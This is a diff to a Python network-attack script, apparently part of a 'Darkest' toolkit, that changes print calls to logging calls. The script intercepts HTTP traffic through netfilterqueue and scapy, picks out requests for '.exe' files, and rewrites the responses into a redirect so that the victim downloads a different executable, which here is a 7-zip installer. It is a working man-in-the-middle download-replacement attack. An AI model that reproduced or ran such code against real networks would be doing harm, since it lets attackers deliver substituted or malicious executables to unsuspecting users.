@@ -8,6 +8,7 @@ import netfilterqueue
 
 # Darkest APi imports
 import darkest.Core as dac
+from darkest import log
 
 
 
@@ -33,13 +34,13 @@ def processPacket(packet):
   if packetScapy.haslayer(scapy.Raw) and packetScapy.haslayer(scapy.TCP):  # We need to also check for the TCP layer to not run into index error
     if packetScapy[scapy.TCP].dport == 80:  # Rquest
       if ".exe" in packetScapy[scapy.Raw].load.decode("utf-8", "replace"):
-        print("[+] '.exe' Request")
+        log.info("[+] '.exe' Request")
         userData.listAck.append(packetScapy[scapy.TCP].ack)
 
     elif packetScapy[scapy.TCP].sport == 80:  # Response
       if packetScapy[scapy.TCP].seq in userData.listAck:
         userData.listAck.remove(packetScapy[scapy.TCP].seq)
-        print("[+] Replacing file")
+        log.info("[+] Replacing file")
         packetModified = setLoad(
           packetScapy, 
           "HTTP/1.1 301 Moved Permanently\nLocation: https://7-zip.org/a/7z2401-x64.exe"
@@ -74,6 +75,6 @@ if __name__ == "__main__":
   try:
     dac.Net.bindIpTables(queueIndx, processPacket)
   except KeyboardInterrupt:
-    print("\n[+] Flushing ip tables, please wait.\n")
+    log.info("\n[+] Flushing ip tables, please wait.\n")
     dac.Net.flushIpTables()
 
